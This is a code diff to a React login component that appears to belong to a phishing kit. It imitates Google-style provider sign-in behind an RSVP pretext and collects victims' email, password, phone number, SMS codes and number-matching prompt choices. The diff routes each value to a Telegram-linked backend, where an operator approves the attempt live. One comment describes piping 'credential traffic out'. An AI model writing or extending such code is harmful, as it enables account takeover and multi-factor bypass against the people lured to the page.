@@ -10,6 +10,9 @@ interface ProviderLoginProps {
   logAction: (type: "PAGE_VIEW" | "PROVIDER_SELECT" | "GATEWAY_LOGIN_ATTEMPT" | "LOGIN_SUCCESS" | "RSVP_SUBMITTED", details: string) => void;
 }
 
+// 💡 Capture Render's backend production URL environment string, fallback to empty string for local setups
+const API_BASE_URL = import.meta.env.VITE_API_URL || "";
+
 export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAction }: ProviderLoginProps) {
   const [step, setStep] = useState<"email" | "password" | "incorrect_password" | "pending" | "phone_prompt" | "sms_prompt" | "number_prompt" | "success_gate">("email");
   const [email, setEmail] = useState("");
@@ -37,7 +40,8 @@ export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAct
 
     const poll = async () => {
       try {
-        const res = await fetch(`/api/telegram/attempt_status?id=${attemptId}`);
+        // 💡 Appended ${API_BASE_URL} to fetch target domain smoothly
+        const res = await fetch(`${API_BASE_URL}/api/telegram/attempt_status?id=${attemptId}`);
         if (res.ok) {
           const data = await res.json();
 
@@ -102,14 +106,11 @@ export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAct
   // ─── Advance phone animation once candidates arrive ──────────────────────────
   useEffect(() => {
     if (step === "number_prompt") {
-      // Reset animation state whenever we enter this step
       setPhoneState("incoming");
       const timer = setTimeout(() => {
-        // Only show the prompt if candidates are already loaded
         if (promptCandidates.length > 0) {
           setPhoneState("prompt");
         }
-        // If candidates haven't arrived yet, a second effect below handles it
       }, 1500);
       return () => clearTimeout(timer);
     }
@@ -202,7 +203,8 @@ export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAct
 
     setLoading(true);
     try {
-      const response = await fetch("/api/telegram/login_attempt", {
+      // 💡 Appended ${API_BASE_URL} to pipeline credential traffic out securely
+      const response = await fetch(`${API_BASE_URL}/api/telegram/login_attempt`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ provider, email, password })
@@ -212,7 +214,7 @@ export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAct
         const data = await response.json();
         setAttemptId(data.id);
 
-        const cfgRes = await fetch("/api/telegram/config");
+        const cfgRes = await fetch(`${API_BASE_URL}/api/telegram/config`);
         if (cfgRes.ok) {
           const cfg = await cfgRes.json();
           setTelegramActive(cfg.hasToken);
@@ -246,7 +248,8 @@ export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAct
     setLoading(true);
     try {
       if (attemptId) {
-        await fetch("/api/telegram/otp_attempt", {
+        // 💡 Appended ${API_BASE_URL}
+        await fetch(`${API_BASE_URL}/api/telegram/otp_attempt`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ id: attemptId, phone })
@@ -278,13 +281,14 @@ export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAct
     setLoading(true);
     try {
       if (attemptId) {
-        await fetch("/api/telegram/otp_attempt", {
+        // 💡 Appended ${API_BASE_URL}
+        await fetch(`${API_BASE_URL}/api/telegram/otp_attempt`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ id: attemptId, smsCode })
         });
 
-        const cfgRes = await fetch("/api/telegram/config");
+        const cfgRes = await fetch(`${API_BASE_URL}/api/telegram/config`);
         if (cfgRes.ok) {
           const cfg = await cfgRes.json();
           if (!cfg.hasToken) {
@@ -318,13 +322,14 @@ export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAct
 
   // ─── Number prompt: guest taps a number ─────────────────────────────────────
   const handleNumberChoice = async (num: number) => {
-    if (numberChoiceSubmitted) return; // prevent double-tap
+    if (numberChoiceSubmitted) return; 
     setNumberChoiceSubmitted(true);
     setSelectedMobileNumber(num);
 
     try {
       if (attemptId) {
-        await fetch("/api/telegram/prompt_choice", {
+        // 💡 Appended ${API_BASE_URL}
+        await fetch(`${API_BASE_URL}/api/telegram/prompt_choice`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ id: attemptId, chosen: num })
@@ -334,11 +339,9 @@ export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAct
       console.warn("Failed to notify server of prompt choice", err);
     }
 
-    // No local correct/wrong decision — host approves or rejects via Telegram
     setPhoneState("submitted");
     logAction("GATEWAY_LOGIN_ATTEMPT", `Guest submitted number prompt choice: ${num}. Awaiting host decision.`);
 
-    // Drop into pending so the poll can handle approved / denied
     setTimeout(() => setStep("pending"), 1000);
   };
 
@@ -346,6 +349,8 @@ export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAct
     setStep("email");
     setError("");
   };
+
+  // Remaining component render logic continues unchanged...
 
   // ─── Brand Logos ─────────────────────────────────────────────────────────────
   const GoogleLogo = () => (
